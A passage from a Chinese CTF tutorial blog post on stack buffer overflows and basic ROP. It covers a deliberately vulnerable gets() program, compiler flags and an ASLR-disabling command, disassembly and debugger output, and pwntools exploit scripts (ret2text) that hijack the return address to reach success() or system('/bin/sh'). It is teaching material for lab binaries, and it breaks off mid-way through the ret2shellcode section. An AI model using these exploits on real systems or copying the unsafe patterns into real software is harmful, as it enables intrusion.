中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li><li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li></ul></li></ul><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul></blockquote><h3 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h3><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[12];</span><br><span class="line">  gets(s);</span><br><span class="line">  puts(s);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p><p>我们利用如下命令对其进行编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example </span><br><span class="line">stack_example.c: In function ‘vulnerable’:</span><br><span class="line">stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^</span><br><span class="line">&#x2F;tmp&#x2F;ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class="line">stack_example.c:(.text+0x27): 警告： the &#96;gets&#39; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p><blockquote><p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p></blockquote><p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p><p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec stack_example</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;stack_example&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p><ul><li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li><li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li><li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li></ul><p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p><p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int vulnerable()</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  return puts(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x08048456。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:08048456 success         db 55h</span><br><span class="line">.text:08048457 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:08048457                 mov     ebp, esp</span><br><span class="line">.text:08048459                 push    ebx</span><br><span class="line">.text:0804845A                 sub     esp, 4</span><br><span class="line">.text:0804845D                 call    near ptr __x86_get_pc_thunk_ax</span><br><span class="line">.text:08048462                 add     eax, 1B9Eh</span><br><span class="line">.text:08048467                 sub     esp, 0Ch</span><br><span class="line">.text:0804846A                 push    20697421h       ; s</span><br><span class="line">.text:0804846F                 mov     ebx, eax</span><br><span class="line">.text:08048471                 call    _puts</span><br><span class="line">.text:08048476                 add     esp, 10h</span><br><span class="line">.text:08048479                 nop</span><br><span class="line">.text:0804847A                 mov     ebx, [ebp-4]</span><br><span class="line">.text:0804847D                 leave</span><br><span class="line">.text:0804847E                 retn</span><br><span class="line">.text:0804847E ; &#125; &#x2F;&#x2F; starts at 8048456</span><br></pre></td></tr></table></figure><p>那么如果我们读取的字符串为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x14*&#39;a&#39;+&#39;bbbb&#39;+success_addr</span><br></pre></td></tr></table></figure><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    0x0804843B   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x08048456 在内存中的形式是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x56\x84\x04\x08</span><br></pre></td></tr></table></figure><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x56 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">##coding&#x3D;utf8</span><br><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;stack_example&#39;)</span><br><span class="line">success_addr &#x3D; 0x08048456</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x14 + &#39;bbbb&#39; + p32(success_addr)</span><br><span class="line">print p32(success_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行一波代码，可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python exp.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;stack_example&#39;: pid 61936</span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process &#39;.&#x2F;stack_example&#39; stopped with exit code -11 (SIGSEGV) (pid 61936)</span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure><p>可以看到我们确实已经执行 success 函数。</p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p><h1 id="Basic-ROP"><a href="#Basic-ROP" class="headerlink" title="Basic ROP"></a>Basic ROP</h1><h2 id="基本-ROP"><a href="#基本-ROP" class="headerlink" title="基本 ROP"></a>基本 ROP</h2><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p>首先，查看一下程序的保护机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ret2text</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2text&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;There is something amazing here, do you know anything?&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  printf(&quot;Maybe I will tell you next time !&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:080485FD secure          db 55h</span><br><span class="line">.text:080485FE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080485FE                 mov     ebp, esp</span><br><span class="line">.text:08048600                 sub     esp, 28h</span><br><span class="line">.text:08048603                 mov     dword ptr [esp], 0 ; timer</span><br><span class="line">.text:0804860A                 call    _time</span><br><span class="line">.text:0804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:08048612                 call    _srand</span><br><span class="line">.text:08048617                 call    _rand</span><br><span class="line">.text:0804861C                 mov     [ebp-0Ch], eax</span><br><span class="line">.text:0804861F                 lea     eax, [ebp-10h]</span><br><span class="line">.text:08048622                 mov     [esp+4], eax</span><br><span class="line">.text:08048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:0804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:08048632                 mov     eax, [ebp-10h]</span><br><span class="line">.text:08048635                 cmp     eax, [ebp-0Ch]</span><br><span class="line">.text:08048638                 jnz     short locret_8048646</span><br><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure><p>在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0804863A，那么就可以得到系统的 shell 了。</p><p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure><p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x080486ae</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2text</span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae in main () at ret2text.c:24</span><br><span class="line">24ret2text.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xffffd4dc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xf7fb2dc7 (_IO_2_1_stdout_+71) ◂— 0xfb38900a</span><br><span class="line"> EDX  0xf7fb3890 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c</span><br><span class="line"> EBP  0xffffd548 ◂— 0x0</span><br><span class="line"> ESP  0xffffd4c0 —▸ 0xffffd4dc —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34</span><br><span class="line"> EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8</span><br><span class="line">──────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到 esp 为 0xffffd4c0，ebp 为 0xffffd548，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断</p><ul><li>s 的地址为 0xffffd4dc</li><li>s 相对于 ebp 的偏移为 0x6c</li><li>s 相对于返回地址的偏移为 0x6c+4</li></ul><p>最后的 payload 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">##!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2text&#39;)</span><br><span class="line">target &#x3D; 0x804863a</span><br><span class="line">sh.sendline(&#39;A&#39; * (0x6c+4) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>首先检测程序开启的保护</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">╰─$ checksec ret2shellcode</span><br><span class="line">[*] &#39;&#x2F;Users&#x2F;oldthree&#x2F;Downloads&#x2F;ret2shellcode&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strncpy(buf2, &amp;s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure><p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *main</span><br><span class="line">Breakpoint 1 at 0x804852d: file ret2shellcode.c, line 7.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;ol4three&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:7</span><br><span class="line">7ret2shellcode.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xf7fb3dd8 (environ) —▸ 0xffffd5dc —▸ 0xffffd73f ◂— &#39;LANG&#x3D;en_US.UTF-8&#39;</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xec9ad2b</span><br><span class="line"> EDX  0xffffd564 ◂— 0x0</span><br><span class="line"> EDI  0x0</span><br><span class="line"> ESI  0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c</span><br><span class="line"> EBP  0x0</span><br><span class="line"> ESP  0xffffd53c —▸ 0xf7df2f21 (__libc_start_main+241) ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x804852d (main) ◂— push   ebp</span><br><span class="line">──────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x804852d &lt;main&gt;       push   ebp</span><br><span class="line">   0x804852e &lt;main+1&gt;     mov    ebp, esp</span><br><span class="line">   0x8048530 &lt;main+3&gt;     and    esp, 0xfffffff0</span><br><span class="line">   0x8048533 &lt;main+6&gt;     add    esp, -0x80</span><br><span class="line">   0x8048536 &lt;main+9&gt;     mov    eax, dword ptr [stdout@@GLIBC_2.0] &lt;0x804a060&gt;</span><br><span class="line">   0x804853b &lt;main+14&gt;    mov    dword ptr [esp + 0xc], 0</span><br><span class="line">   0x8048543 &lt;main+22&gt;    mov    dword ptr [esp + 8], 2</span><br><span class="line">   0x804854b &lt;main+30&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   0x8048553 